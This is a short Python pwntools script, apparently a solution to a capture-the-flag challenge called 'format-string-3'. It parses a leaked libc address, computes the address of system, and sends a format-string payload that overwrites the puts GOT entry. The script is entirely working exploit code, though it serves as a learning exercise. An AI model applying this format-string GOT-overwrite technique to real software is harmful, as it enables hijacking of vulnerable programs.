from pwn import *

setvbuf_offset = 0x7a3f0
execve_offset = 0xda9f0
system_offset = 0x4f760
puts_got = 0x404018

if __name__ == "__main__":

    r = process("./format-string-3")
    r.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
    res = r.recvline()

    setvbuf_address = int(res[:-1].decode(), base=16)
    libc_base = setvbuf_address - setvbuf_offset
    system_address = libc_base + system_offset

    payload = (f"%{system_address}c%35$n").encode()
    payload += b"A" * (8 - len(payload) % 8)
    print(len(payload))
    payload += p64(puts_got)
    print(payload)
    r.sendline(payload)
    print(r.recvall())
    #r.interactive()
